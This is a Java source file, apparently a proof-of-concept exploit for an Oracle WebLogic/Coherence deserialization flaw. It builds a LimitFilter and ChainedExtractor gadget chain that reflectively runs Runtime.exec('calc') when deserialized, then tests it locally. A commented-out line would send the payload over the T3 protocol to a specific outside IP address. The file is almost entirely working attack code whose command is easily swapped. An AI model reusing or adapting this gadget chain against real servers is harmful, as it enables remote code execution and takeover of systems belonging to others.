package com.supeream;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.AlwaysFilter;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.*;

/*
Powered by UnicodeSec
 */

public class App
{
    public static void main( String[] args ) throws Exception {
        ValueExtractor[] poc = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[] {
                        "getRuntime", new Class[0] }),
                new ReflectionExtractor("invoke", new Object[] {
                        null, new Object[0] }),
                new ReflectionExtractor("exec", new String[]{"calc"})
        };
        ChainedExtractor chained = new ChainedExtractor(poc);
        LimitFilter limit = new LimitFilter(new AlwaysFilter(), 1);
        limit.setComparator(chained);
        limit.setTopAnchor(Runtime.class);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(limit);


        //byte[] payload = Serializables.serialize(expException);
        //T3ProtocolOperation.send("111.75.213.85", "80", payload);

        //serialize(expException);
        // 序列化测试
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bytes);
        oos.writeObject(expException);
        oos.close();
        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes.toByteArray()));
        BadAttributeValueExpException newUser = (BadAttributeValueExpException)ois.readObject();
        System.out.println(newUser.toString());

    }
    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}